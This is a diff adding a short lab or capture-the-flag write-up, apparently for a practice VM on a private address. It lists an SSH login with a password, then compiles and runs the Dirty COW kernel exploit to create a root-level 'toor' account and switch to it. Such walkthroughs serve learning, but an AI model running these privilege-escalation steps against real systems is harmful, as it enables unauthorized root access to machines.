@@ -1,0 +1,19 @@
+********************************************************************
+                        LAURIE'S PART
+********************************************************************
+
+We connect to ssh with laurie's user :
+    - ssh laurie@192.168.56.107
+    password : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+
+We use the dirtycow to escalation privilege and become root.
+
+We compile the dirty.c  : cc -pthread dirty.c -o dirty -lcrypt
+We execute dirty        : ./dirty
+
+We choose a password    : dirty
+
+Then we use the toor user to connect with root.
+su toor : dirty
+
